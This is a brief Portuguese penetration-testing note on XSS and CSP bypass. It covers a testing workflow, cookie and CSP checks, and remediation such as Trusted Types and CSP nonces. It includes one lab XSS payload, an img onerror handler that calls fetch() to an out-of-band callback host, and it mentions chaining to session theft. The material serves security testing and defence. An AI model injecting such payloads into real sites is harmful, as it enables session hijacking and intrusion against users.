# CSP bypass gadgets

## Leitura rápida

XSS moderno raramente é `alert(1)`: o valor está em roubo de sessão, bypass de CSRF,
abuso de WebMessages e chain com CSP bypass. DOM XSS exige data flow (source→sink) real.

## Foco

- Se não validar **JSONP, CDNs antigos, nonce leak**, a nota fica genérica.
- Sink + contexto + cookie flags. Encadeio até ação autenticada ou token se HttpOnly falhar.

## Mãos na massa

1. Mapeio reflections e sinks DOM (innerHTML, location, postMessage).
2. Testo contextos (HTML, attr, JS, URL, CSS).
3. Avalio cookies HttpOnly e CSP.
4. Construir PoC de impacto (sessão de teste / ação).
5. Verifico mutação por sanitizers (DOMPurify misconfig).

## Sinal / query

```html
<!-- reflected/stored lab payload — sem persistir em prod -->
<img src=x onerror="fetch('https://oast.lab.local/bd6b41')">
<!-- sink csp-bypass: sessão USER_A / cookie flags -->
```

Não persisto payload em produção sem janela e plano de purge.

## Pitfall

Não capture sessões de usuários reais. Evito defacement.

## Detecção / remediação

CSP reports; WAF XSS signatures; canary cookies.

→ HttpOnly+Secure+SameSite; CSP nonce/hash; sanitização server+client;
Trusted Types.

## Prova

PoC HTML; cookie flags; impacto narrado.

## Refs

- PortSwigger XSS
- OWASP XSS
- WSTG-INPV-01/02